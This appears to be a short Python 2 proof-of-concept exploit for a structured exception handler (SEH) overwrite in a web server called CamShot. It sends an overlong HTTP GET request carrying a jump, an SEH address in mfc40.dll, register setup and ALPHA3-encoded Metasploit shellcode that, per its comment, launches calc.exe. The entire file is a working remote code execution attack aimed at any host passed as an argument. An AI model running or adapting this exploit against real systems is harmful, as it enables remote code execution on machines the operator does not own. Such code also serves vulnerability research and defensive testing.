# CamShot SEH overwrite by tecnik

import socket, sys

if len(sys.argv)!=2:
    print "Usage: camshot.py <target>"
    exit()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1],80))

print "Sending Exploit to:" + sys.argv[1]

# GET request + overflow string
request  ="GET /"
request +="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
# short jump over SE Handler Addr overwrite
request +="\x90\x90\xEB\x07"
# overwrite SEH to point to mfc40.dll (no SafeSeh) JMP [EBP-4]
request +="\x9A\xF7\xA9\x61"
# NOP's I haven't cleaned up; SUB EBP,-508; XCHG EBP,EDX; (to setup Base Addr for ALPHA3 encoded shellcode)
request +="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x81\xED\xF8\xFA\xFF\xFF\x90\x90\x87\xEA" 

# ALPHA3 encoded (lowercase ascii with EDX base) Metasploit shellcode (Exec calc.exe)
request +="j314d34djq34djk34d1421r11r7j314d34dj234dkmr502dr5o0d25usz85561k20213o83060499913o2656e327e79ld1303l2k88gnd0x3xmxlk856c7cn40k049kle6570ob0xkk9d3901ok5d3dnx5c0emxn831o57cox6x5d4b5dng6fkg322532l911l4of4k8k3x89ldmc151xj953nfkx6f333c19l0me645g1254okmel505023co30eo87fm178jg30m8n2l14g4c8el342997b5x9xn049845xok4415503g3gn41fmdlb6fnk629cjkk2j59878n23e413881nb9c1fme241gl1nx0e711369ne90j13e0b120dke581d42121co07c83k2lele4x5k3d7go84d9c015x038d32l5o36g088c0b930229j9oe7x332bjg8f3825nk422081888clx9g0k3cl5j8kf7139197"


request +=" HTTP/1.1\r\n"
request +="HOST: 127.0.0.1\r\n\r\n"

s.send(request)

print "Done."

s.close()
